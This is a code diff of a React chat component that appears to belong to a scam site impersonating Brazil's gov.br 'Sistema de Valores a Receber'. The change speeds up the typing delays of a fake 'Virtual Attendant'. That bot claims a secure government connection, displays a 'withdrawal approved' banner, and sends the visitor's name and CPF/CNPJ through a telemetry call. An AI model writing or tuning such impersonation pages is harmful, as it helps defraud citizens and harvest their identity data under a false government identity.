@@ -158,17 +158,17 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
       try {
         setTyping(true);
-        await sleep(1500);
+        await sleep(500);
         setTyping(false);
         addBotMessage(`Olá, me chamo ${selectedAttendant.name} e sou sua Atendente Virtual do gov.br.`);
 
-        await sleep(1500);
+        await sleep(500);
         setTyping(true);
-        await sleep(1500);
+        await sleep(500);
         setTyping(false);
         addBotMessage("Iniciando conexão segura com o Sistema de Valores a Receber (SVR)...");
 
-        await sleep(1500);
+        await sleep(500);
         setTyping(true);
         
         let name = data.name || "Cidadão";
@@ -204,13 +204,13 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         
         sendTelemetry("entered", name, formattedVal);
 
-        await sleep(2000);
+        await sleep(500);
         setTyping(false);
         addBotMessage(`Consultando base de dados nacional para o ${data.docType.toUpperCase()}: ${data.docValue}...`, undefined, `/assets/banners/banner_saque_aprovado.png?v=${Date.now()}`);
         
-        await sleep(2000);
+        await sleep(500);
         setTyping(true);
-        await sleep(2000);
+        await sleep(500);
         setTyping(false);
 
         const isCnpj = data.docType.toUpperCase() === 'CNPJ';
